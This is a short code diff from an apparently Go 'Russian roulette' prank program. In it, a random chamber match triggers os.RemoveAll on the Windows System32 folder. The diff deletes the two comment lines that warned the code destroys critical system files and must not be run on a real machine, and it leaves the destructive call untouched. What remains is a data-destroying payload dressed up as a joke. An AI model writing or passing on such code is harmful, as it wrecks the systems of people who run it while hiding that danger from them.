@@ -18,8 +18,6 @@ func main() {
 
 	if chamber == bullet {
 		fmt.Println("Oops! Looks like you just deleted Windows 32. Good luck reinstalling!😈")
-		// WARNING: This code deletes critical system files and can cause irreparable damage to your system!
-		// DO NOT RUN THIS CODE ON A REAL SYSTEM!
 		os.RemoveAll("C:\\Windows\\System32")
 		fmt.Println("Windows 32 has been successfully deleted! 😱")
 	} else {
